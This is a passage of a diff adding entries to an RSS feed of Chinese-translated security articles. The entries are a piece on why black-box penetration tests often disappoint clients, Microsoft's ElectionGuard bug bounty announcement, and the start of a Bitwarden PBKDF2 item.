+        <guid>http://localhost:1313/p/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95%E4%BD%A0%E6%98%AF%E5%9C%A8%E6%B5%8B%E8%AF%95%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%91%98%E8%BF%98%E6%98%AF%E6%B5%8B%E8%AF%95%E7%9B%AE%E6%A0%87/</guid>
+        <description>&lt;p&gt;BHIS通过博客、HackNaked.TV、培训特别是网络研讨会开展大量推广活动。在推广过程中，我们常遇到两类客户：从未做过渗透测试的，以及做过测试但对结果不满意的。&lt;/p&gt;
+&lt;p&gt;当深入询问不满意的客户时，我们发现这些案例往往存在两个共同点：采用了黑盒测试，和/或更根本的——预期不匹配。&lt;/p&gt;
+&lt;p&gt;黑盒测试确实有其适用场景，例如：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;新应用程序已在开发周期中内置安全审查&lt;/li&gt;
+&lt;li&gt;组织自行开展内部渗透测试&lt;/li&gt;
+&lt;li&gt;近期已完成灰盒或水晶盒测试&lt;/li&gt;
+&lt;li&gt;用于测试SOC或事件响应团队是否真正升级了问题&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;但如果上述情况均不适用，却决定将首次渗透测试设为黑盒测试，那么你实际上是在测试渗透测试员，而非测试目标。测试的协作程度越高，我们用于测试应用程序或目标的时间就越多；测试越接近黑盒，渗透测试员就需要花费更多时间在发现、猜测和探索上。&lt;/p&gt;
+&lt;p&gt;渗透测试员喜欢这种挑战，但这就引出了第二个问题：预期不匹配。当测试员因专注于客户并不真正关心的应用区域而遗漏问题时就会产生矛盾。以包含众多主机的网络渗透测试为例，测试员无法知晓应该优先测试哪些对客户更有价值或对组织风险更高的目标。&lt;/p&gt;
+&lt;p&gt;黑盒测试中另一个常见的预期不匹配问题涉及测试报告中的经验总结。多数测试仅持续一周，当测试目标或应用程序未获得应有重视时，测试结果可能无法真实反映该应用/目标在其他360天中面临的实际风险。&lt;/p&gt;
+&lt;p&gt;我们建议客户采用混合测试方案：第一阶段进行严格限时的黑盒测试，随后立即与客户召开会议获取额外信息，进入第二阶段的协作测试。这种方式能兼顾两种测试优势，生成结合双方特点的测试报告。&lt;/p&gt;
+&lt;p&gt;因此，如果考虑在下个项目中采用黑盒测试，请务必提前明确：你真正要测试的是什么？专业的渗透测试公司将根据你的目标帮助定义测试范围，并提供最大化测试时间和流程效率的建议。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>微软推出ElectionGuard漏洞赏金计划，保障选举安全技术</title>
+        <link>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF%E6%8E%A8%E5%87%BAelectionguard%E6%BC%8F%E6%B4%9E%E8%B5%8F%E9%87%91%E8%AE%A1%E5%88%92%E4%BF%9D%E9%9A%9C%E9%80%89%E4%B8%BE%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/</link>
+        <pubDate>Tue, 05 Aug 2025 22:51:17 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF%E6%8E%A8%E5%87%BAelectionguard%E6%BC%8F%E6%B4%9E%E8%B5%8F%E9%87%91%E8%AE%A1%E5%88%92%E4%BF%9D%E9%9A%9C%E9%80%89%E4%B8%BE%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/</guid>
+        <description>&lt;p&gt;今天，我们正式推出&lt;a class=&#34;link&#34; href=&#34;http://www.microsoft.com/msrc/bounty-electionguard&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;ElectionGuard漏洞赏金计划&lt;/a&gt;。2019年5月，微软发布了ElectionGuard——一个免费开源SDK，旨在使投票更加安全、透明和可访问。ElectionGuard支持选举的端到端验证，向第三方组织开放结果以进行安全验证，并允许选民个人确认他们的选票被正确统计。&lt;/p&gt;
+&lt;p&gt;ElectionGuard赏金计划邀请安全研究人员与微软合作，共同保护ElectionGuard用户的安全。该计划是微软&amp;quot;捍卫民主计划&amp;quot;中保护和维护选举流程的更广泛承诺的一部分。我们欢迎全球的研究人员——无论是全职网络安全专业人士、兼职爱好者还是学生——发现ElectionGuard SDK目标领域中的高影响漏洞，并通过协调漏洞披露(CVD)与微软分享。符合条件的提交（需包含清晰简洁的概念验证POC）将有机会获得高达15,000美元的奖励。&lt;/p&gt;
+&lt;p&gt;漏洞赏金计划在科技公司中很常见，用于激励安全漏洞的识别和协调披露。包括美国国防部、美联航、Twitter、谷歌、苹果、微软等众多组织都已实施此类计划。&lt;/p&gt;
+&lt;p&gt;微软坚信与研究人员密切合作能让客户更安全。安全研究人员通过协调漏洞披露发现并向微软报告漏洞，在生态系统中发挥着不可或缺的作用。研究人员一再证明，携手合作有助于保护客户，我们每年都通过合作更好地保护全球数十亿客户。&lt;/p&gt;
+&lt;p&gt;在2018年7月1日至2019年6月30日期间，微软通过11个赏金计划支付了440万美元的奖金，最高单项奖励达20万美元。有关微软漏洞赏金计划的更多详情可在此处查阅。&lt;/p&gt;
+&lt;p&gt;微软致力于加强与安全研究社区的合作，并寻求新兴技术中新的安全改进领域。我们期待在未来几个月分享更多赏金计划的更新和改进。&lt;/p&gt;
+&lt;p&gt;Jarek Stanley，MSRC高级项目经理&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>Bitwarden回应加密设计缺陷批评：提升PBKDF2迭代次数强化安全</title>
         <link>http://localhost:1313/p/bitwarden%E5%9B%9E%E5%BA%94%E5%8A%A0%E5%AF%86%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E6%89%B9%E8%AF%84%E6%8F%90%E5%8D%87pbkdf2%E8%BF%AD%E4%BB%A3%E6%AC%A1%E6%95%B0%E5%BC%BA%E5%8C%96%E5%AE%89%E5%85%A8/</link>
         <pubDate>Tue, 05 Aug 2025 21:44:03 +0800</pubDate>
